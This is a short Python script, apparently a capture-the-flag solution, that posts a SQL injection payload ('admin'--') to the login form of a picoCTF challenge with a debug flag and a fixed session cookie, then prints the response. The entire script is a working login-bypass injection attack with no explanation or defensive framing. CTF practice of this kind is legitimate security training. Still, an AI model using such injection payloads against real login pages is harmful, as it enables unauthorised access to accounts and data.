#!/usr/bin/python
import requests

url = 'https://jupiter.challenges.picoctf.org/problem/33850/'
data = 'username=admin%27--+&password=jj&debug=1'
header = {
'Content-Type':'application/x-www-form-urlencoded',
'Cookie': 'PHPSESSID=1rsokea65lmfuu3hrgpff6ue7p'
        }        
p = requests.post(url + 'login.php', data=data,headers=header)
print (p.text)#[152:178]
